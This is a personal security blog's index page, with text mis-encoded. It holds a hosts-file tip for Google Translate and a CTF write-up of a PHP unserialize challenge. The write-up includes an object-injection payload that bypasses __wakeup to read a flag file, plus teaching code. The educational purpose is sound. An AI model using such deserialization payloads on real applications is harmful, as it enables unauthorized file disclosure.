<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Zhsgo_blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="æ¬¢è¿æ¥åˆ°Zhsgoçš„åšå®¢å“¦,å¸Œæœ›ä¸€èµ·è¿›æ­¥å‘€(ï¿£yâ–½,ï¿£)â•­">
<meta property="og:type" content="website">
<meta property="og:title" content="Zhsgo_blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Zhsgo_blog">
<meta property="og:description" content="æ¬¢è¿æ¥åˆ°Zhsgoçš„åšå®¢å“¦,å¸Œæœ›ä¸€èµ·è¿›æ­¥å‘€(ï¿£yâ–½,ï¿£)â•­">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Zhsgo Doe">
<meta property="article:tag" content="ç½‘ç»œå®‰å…¨">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Zhsgo_blog" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Zhsgo_blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS è®¢é˜…"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="æœç´¢"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="æœç´¢"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-å¤æ´»Googleç¿»è¯‘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" class="article-date">
  <time class="dt-published" datetime="2022-11-21T09:59:52.000Z" itemprop="datePublished">2022-11-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">å…¶ä»–</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">å¤æ´»Googleç¿»è¯‘</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿‘æœŸå‘ç°æˆ‘çš„Googleç¿»è¯‘æ— æ³•ä½¿ç”¨äº†ï¼ˆç»å¸¸çš„æ¯›ç—…ï¼‰ï¼Œäºæ˜¯å°±è¯•ç€æ‰¾ä¸‹Googleç¿»è¯‘ä¸€äº›å¯ç”¨IPï¼Œç„¶åå°†è¿™äº›IPæ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­ï¼ŒGoogleç¿»è¯‘å°±å®Œç¾å¤æ´»äº†ã€‚å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒGoogleç¿»è¯‘Iæ— æ³•ä½¿ç”¨å•¦ï¼ˆè¿™ä¹ˆå¤šIPï¼ŒGoogleç¿»è¯‘ç¨³å®šæ€§å°†ä¼šå¤§å¤§æ»´æé«˜ğŸ¥³ğŸ¥³ï¼‰â™ª(Â´â–½ï½€)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ³¨ï¼šä»€ä¹ˆæ˜¯hostsæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">hostsæ˜¯ä¸€ä¸ªæ²¡æœ‰æ‰©å±•åçš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå…¶ä½œç”¨å°±æ˜¯å°†ä¸€äº›å¸¸ç”¨çš„ç½‘å€åŸŸåä¸å…¶å¯¹åº”çš„IPåœ°å€å»ºç«‹ä¸€ä¸ªå…³è”â€œæ•°æ®åº“â€ï¼Œå½“ç”¨æˆ·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘å€æ—¶ï¼Œç³»ç»Ÿä¼šé¦–å…ˆè‡ªåŠ¨ä»Hostsæ–‡ä»¶ä¸­å¯»æ‰¾å¯¹åº”çš„IPåœ°å€å¹¶æ‰“å¼€å¯¹åº”ç½‘é¡µï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™ç³»ç»Ÿä¼šå†å°†ç½‘å€æäº¤DNSåŸŸåè§£ææœåŠ¡å™¨è¿›è¡ŒIPåœ°å€çš„è§£æã€‚</span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢çœ‹ä¸‹å…·ä½“è¿‡ç¨‹å­</p>
<p>é¦–å…ˆæ‰¾åˆ°å¹¶ç”¨è®°äº‹æœ¬æ‰“å¼€Windowsä¸‹hostsæ–‡ä»¶ï¼Œä½ç½®æ˜¯â€œ<strong>C:\Windows\System32\drivers\etc</strong>â€ã€‚</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121180954742.png" alt="image-20221121180954742"></p>
<p>ç„¶åå°†ä¸‹é¢çš„IP åŸŸåä¸€èµ·å¤åˆ¶ä¸‹ï¼Œå¹¶åœ¨hostsæ–‡ä»¶ä¸­æ‰¾ä¸ªä½ç½®ç²˜è´´ä¸‹æ¥</p>
<p><img src="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/image-20221121181312643.png" alt="image-20221121181312643"></p>
<p>æœ€åæŒ‰ä¸‹<strong>crlé”®åŠ sé”®</strong>ä¿å­˜ä¸‹æ¥å°±å¥½äº†Ï†(*ï¿£0ï¿£)</p>
<p>æ³¨ï¼šæœ‰çš„å°ä¼™ä¼´å¯èƒ½é‡åˆ°hostsæ–‡ä»¶æ‰“ä¸å¼€ç­‰æƒ…å†µï¼Œå»ºè®®å»ç™¾åº¦æœç´¢ä¸‹ç”µè„‘ç»™å‡ºçš„æŠ¥é”™ä¿¡æ¯ï¼Œç„¶åæŒ‰æŒ‡ç¤ºæ“ä½œå°±å¥½å•¦~</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">142.250.4.90 translate.googleapis.com</span><br><span class="line">172.253.114.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br><span class="line">142.250.9.90 translate.googleapis.com</span><br><span class="line">172.253.116.90 translate.googleapis.com</span><br><span class="line">142.250.97.90 translate.googleapis.com</span><br><span class="line">142.250.30.90 translate.googleapis.com</span><br><span class="line">142.250.111.90 translate.googleapis.com</span><br><span class="line">172.217.215.90 translate.googleapis.com</span><br><span class="line">142.250.11.90 translate.googleapis.com</span><br><span class="line">142.251.9.90 translate.googleapis.com</span><br><span class="line">108.177.122.90 translate.googleapis.com</span><br><span class="line">142.250.96.90 translate.googleapis.com</span><br><span class="line">142.250.100.90 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.214.90 translate.googleapis.com</span><br><span class="line">172.217.222.90 translate.googleapis.com</span><br><span class="line">142.250.31.90 translate.googleapis.com</span><br><span class="line">142.250.126.90 translate.googleapis.com</span><br><span class="line">142.250.10.90 translate.googleapis.com</span><br><span class="line">172.217.195.90 translate.googleapis.com</span><br><span class="line">172.253.115.90 translate.googleapis.com</span><br><span class="line">142.251.5.90 translate.googleapis.com</span><br><span class="line">142.250.136.90 translate.googleapis.com</span><br><span class="line">142.250.12.90 translate.googleapis.com</span><br><span class="line">142.250.101.90 translate.googleapis.com</span><br><span class="line">172.217.192.90 translate.googleapis.com</span><br><span class="line">142.250.0.90 translate.googleapis.com</span><br><span class="line">142.250.107.90 translate.googleapis.com</span><br><span class="line">172.217.204.90 translate.googleapis.com</span><br><span class="line">142.250.28.90 translate.googleapis.com</span><br><span class="line">142.250.125.90 translate.googleapis.com</span><br><span class="line">172.253.124.90 translate.googleapis.com</span><br><span class="line">142.250.8.90 translate.googleapis.com</span><br><span class="line">142.250.128.90 translate.googleapis.com</span><br><span class="line">142.250.112.90 translate.googleapis.com</span><br><span class="line">142.250.27.90 translate.googleapis.com</span><br><span class="line">142.250.105.90 translate.googleapis.com</span><br><span class="line">172.253.126.90 translate.googleapis.com</span><br><span class="line">172.253.123.90 translate.googleapis.com</span><br><span class="line">172.253.122.90 translate.googleapis.com</span><br><span class="line">172.253.62.90 translate.googleapis.com</span><br><span class="line">142.250.98.90 translate.googleapis.com</span><br><span class="line">142.250.185.238 translate.googleapis.com</span><br><span class="line">142.251.116.101 translate.googleapis.com</span><br><span class="line">216.58.214.14 translate.googleapis.com</span><br><span class="line">142.250.189.206 translate.googleapis.com</span><br><span class="line">216.58.209.174 translate.googleapis.com</span><br><span class="line">142.250.203.142 translate.googleapis.com</span><br><span class="line">142.250.218.14 translate.googleapis.com</span><br><span class="line">142.251.10.138 translate.googleapis.com</span><br><span class="line">142.251.40.174 translate.googleapis.com</span><br><span class="line">142.250.185.174 translate.googleapis.com</span><br><span class="line">172.217.16.46 translate.googleapis.com</span><br><span class="line">172.217.0.46 translate.googleapis.com</span><br><span class="line">172.217.31.142 translate.googleapis.com</span><br><span class="line">216.58.220.142 translate.googleapis.com</span><br><span class="line">172.217.13.142 translate.googleapis.com</span><br><span class="line">142.250.110.90 translate.googleapis.com</span><br><span class="line">172.217.203.90 translate.googleapis.com</span><br><span class="line">172.253.112.90 translate.googleapis.com</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/" data-id="claqmby5c0000zgv47q2g7970" data-title="å¤æ´»Googleç¿»è¯‘" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSSCTF-SWPUCTF-ez-ez-unserialize" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" class="article-date">
  <time class="dt-published" datetime="2022-10-20T10:00:30.000Z" itemprop="datePublished">2022-10-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">ç”±NSSCTF-SWPUCTF-ez_ez_unserializeï¼Œå¼•å‘å¯¹ååºåˆ—å…·ä½“è¯¦ç»†è¿‡ç¨‹ä»¥åŠå¯¹__constructï¼Œ__destructå‡½æ•°æ‰§è¡Œæƒ…å†µæ·±åº¦åˆ†æ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å‰ç½®çŸ¥è¯†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1ï¼Œphpä¸­__FILE__æ˜¯ä»€ä¹ˆæ„æ€ï¼Œ</span><br><span class="line">phpä¸­__FILE__æ˜¯ä¸€ä¸ªé­”æœ¯å¸¸é‡ï¼Œå®ƒä¼šè¿”å›å½“å‰æ‰§è¡ŒPHPè„šæœ¬çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚è‡ªPHP 4.0.2ç‰ˆæœ¬èµ·ï¼Œå®ƒæ€»æ˜¯åŒ…å«ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</span><br><span class="line"></span><br><span class="line">2,__wakeup()è¯´æ˜ï¼Œ</span><br><span class="line">unserialize()ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup() æ–¹æ³•</span><br><span class="line"></span><br><span class="line">3ï¼Œ__wakeup()é­”æœ¯æ–¹æ³•ç»•è¿‡ï¼Œ</span><br><span class="line">phpç‰ˆæœ¬ä¸ºPHP5&lt;5.6.25ï¼ŒPHP7 &lt; 7.0.10æ—¶ï¼Œåªè¦åºåˆ—åŒ–çš„ä¸­çš„æˆå‘˜æ•°å¤§äºå®é™…æˆå‘˜æ•°ï¼Œå³å¯ç»•è¿‡è¯¥é­”æ³•å‡½æ•°ï¼Œæ¯”å¦‚ä¸€ä¸ªctfçš„ç±»åºåˆ—åŒ–åæ˜¯   </span><br><span class="line">O:3:&quot;ctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">æŠŠæˆå‘˜æ•°&quot;1&quot;ï¼Œæ”¹ä¸º&quot;2&quot;å³å¯ç»•è¿‡ï¼Œæ›´æ”¹ä¹‹åä¸º</span><br><span class="line">O:3:&quot;ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥é¶åœºï¼Œå‘ç°æ˜¯ä¸€ä¸ªååºåˆ—åŒ–é¢˜ç›®ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$x</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;x !== <span class="keyword">__FILE__</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;x = <span class="keyword">__FILE__</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">        <span class="comment">//flag is in fllllllag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆè¯´ä¸‹æˆ‘å½“æ—¶çš„æƒ³æ³•ï¼Œå°±æ˜¯ä¸€çœ‹åˆ°__wakeup()ï¼Œå…«æˆæ˜¯è¦ç»•è¿‡å®ƒçš„ï¼Œç„¶åå±é™©å‡½æ•°æ˜¯highlight_file()ï¼Œåªéœ€è¦æŠŠé‡Œé¢çš„å˜é‡æ¢ä¸ºflagçš„ç»å¯¹è·¯å¾„ï¼Œç„¶åå°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸­è·¯å¾„ä¿®æ”¹ä¸ºé¶æœºflagæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œæ¥ç€å†ä¿®æ”¹æˆå‘˜æ•°ï¼ˆå¿…é¡»å¤§äºå½“å‰çœŸå®çš„æˆå‘˜æ•°ç›®ï¼‰ï¼Œæäº¤å‚æ•°å°±å¯ä»¥äº†ã€‚</p>
<p>ç¼–å†™pocï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœä¸ºï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\æ¡Œé¢\å·¥å…·\php\teacher.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>ç™¾åº¦æœä¸‹linuxçš„wwwæ–‡ä»¶ç›®å½•ä¸€èˆ¬æ˜¯ä»€ä¹ˆï¼Œ</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png"></p>
<p>é‚£ä¹ˆæŠŠç›®å½•ä¿®æ”¹ä¸‹ï¼Œæœ€ç»ˆçš„payloadä¸ºï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:27:&quot;/var/www/html/fllllllag.php&quot;;&#125;</span><br><span class="line">//æ³¨æ„ç›®å½•æ”¹å˜åï¼Œéœ€è¦å°†ç›®å½•çš„é•¿åº¦ä¿®æ”¹ä¸ºå½“å‰å®é™…é•¿åº¦27ï¼ˆåŸæ¥æ˜¯37ï¼‰</span><br><span class="line">//å› ä¸ºè¦ç»•è¿‡__wakeup()ï¼Œéœ€è¦å°†æˆå‘˜æ•°1ä¿®æ”¹ä¸º2ï¼ˆä»»ä½•å¤§äº1çš„éƒ½å¯ä»¥ï¼‰</span><br></pre></td></tr></table></figure>

<p>æäº¤æˆåŠŸï¼Œflagæµ®ç°ï¼Œ</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/3.png"></p>
<hr>
<hr>
<p>â€‹              <em><strong>å†™ä¸€ä¸ªé¢˜ç›®çš„ç›®çš„ä¸ä»…ä»…æ˜¯æ‰¾åˆ°æ­£ç¡®flagå¾—åˆ†ï¼Œæ›´é‡è¦çš„æ˜¯ä»è¿™ä¸ªé¢˜ç›®ä¸­å­¦åˆ°äº†äº›ä»€ä¹ˆçŸ¥è¯†</strong></em></p>
<p>è¿™ä¸ªé¢˜ç›®æˆ‘åªæ˜¯ä¾é ç»éªŒåšå‡ºæ¥äº†ï¼Œä½†æ˜¯å¦‚æœè®©æˆ‘å…·ä½“åˆ†æ</p>
<p>1ï¼Œä¸ºä»€ä¹ˆè¦ç»•è¿‡<code>__wakeup()</code>ï¼Œä¸ç»•è¿‡ä¸ºä»€ä¹ˆä¸è¡Œï¼Ÿ</p>
<p>2ï¼Œä¸ºä»€ä¹ˆæäº¤payloadåä¸æ˜¯æ˜¾ç¤ºçš„æ˜¯<code>x = __FILE__;</code>çš„æºç ï¼Ÿè§¦å‘__construct()å‡½æ•°ä¸æ˜¯ä¼šå°†$xèµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶ä»¶ç»å¯¹è·¯å¾„å—ï¼Ÿæˆ‘è¯´ä¸å‡ºæ¥â€¦â€¦</p>
<hr>
<hr>
<p>æ‰€ä»¥åœ¨æäº¤å®Œæ­£ç¡®çš„flagåï¼Œæˆ‘ä¹Ÿæ˜¯æƒ³åˆ°äº†åˆšæ‰è¯´çš„ä¸¤ä¸ªé—®é¢˜ï¼Œäºæ˜¯ä¹å†ç ”ç©¶äº†ä¸€ä¸‹ï¼Œç°åœ¨å›ç­”ä¸‹è¿™ä¸¤ä¸ªé—®é¢˜ã€‚</p>
<p>å…ˆäº†è§£ä¸€ä¸‹ååºåˆ—åŒ–å…·ä½“è¿‡ç¨‹ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>() å¯¹å•ä¸€çš„å·²åºåˆ—åŒ–çš„å˜é‡è¿›è¡Œæ“ä½œï¼Œå°†å…¶è½¬æ¢å› php çš„å€¼ã€‚åœ¨è§£åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å‰ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»åœ¨è§£åºåˆ—åŒ–ä¹‹å‰å®šä¹‰ã€‚ </span><br><span class="line">ç®€å•æ¥ç†è§£èµ·æ¥å°±ç®—å°†åºåˆ—åŒ–è¿‡å­˜å‚¨åˆ°æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œæ¢å¤åˆ°ç¨‹åºä»£ç çš„å˜é‡è¡¨ç¤ºå½¢å¼çš„è¿‡ç¨‹ï¼Œæ¢å¤åˆ°å˜é‡åºåˆ—åŒ–ä¹‹å‰çš„ç»“æœã€‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">file_get_contents</span>(â€˜./ç›®æ ‡æ–‡æœ¬æ–‡ä»¶<span class="string">&#x27;); //å–å¾—æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼ˆä¹‹å‰åºåˆ—åŒ–è¿‡çš„å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line"><span class="string">$å˜é‡ = unserialize($s); //å°†è¯¥æ–‡æœ¬å†…å®¹ï¼Œååºåˆ—åŒ–åˆ°æŒ‡å®šçš„å˜é‡ä¸­</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥äº†è§£ååºåˆ—åŒ–ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;user &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old. &lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//é‡å»ºå¯¹è±¡</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:10;s:4:&quot;name&quot;;s:4:&quot;tome&quot;;&#125;&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æºç çŸ¥é“ï¼Œè™½ç„¶æ²¡æœ‰åˆ›å»ºç±»userçš„å¯¹è±¡ï¼Œä½†æ˜¯ååºåˆ—åŒ–ä¹‹åï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨$userä¸­çš„printdata()æ–¹æ³•ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œunserialize()å‡½æ•°è¿”å›çš„æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Œä¸ºä»€ä¹ˆå¯ä»¥å½“å¯¹è±¡ä½¿ç”¨ï¼Ÿ</p>
<p>åœ¨æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œ</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/6.png"></p>
<p>å‘ç°unserialize()å‡½æ•°è¿”å›å€¼æ˜¯ç±»userçš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œå…¶ä¸­å¯¹è±¡é‡Œå˜é‡$ageï¼Œ$nameçš„å€¼æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œå¯¹åº”çš„ï¼Œ10ï¼Œtomeã€‚</p>
<p><strong>ç®€å•è¯´ï¼Œä¸ç®¡ç±»ä¸­å˜é‡å€¼æ˜¯ä»€ä¹ˆï¼Œæ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é‡Œå˜é‡çš„å€¼æ˜¯ä»€ä¹ˆï¼Œååºåˆ—åŒ–ååˆ›å»ºçš„è¯¥ç±»å¯¹è±¡é‡Œçš„å˜é‡å€¼å°±æ˜¯ä»€ä¹ˆã€‚</strong></p>
<p>ä¸Šè¿°ä»£ç è¿è¡Œç»“æœå¦‚ä¸‹ï¼Œ</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/5.png"></p>
<p>éªŒè¯äº†ä¸Šè¿°çŒœæµ‹ã€‚</p>
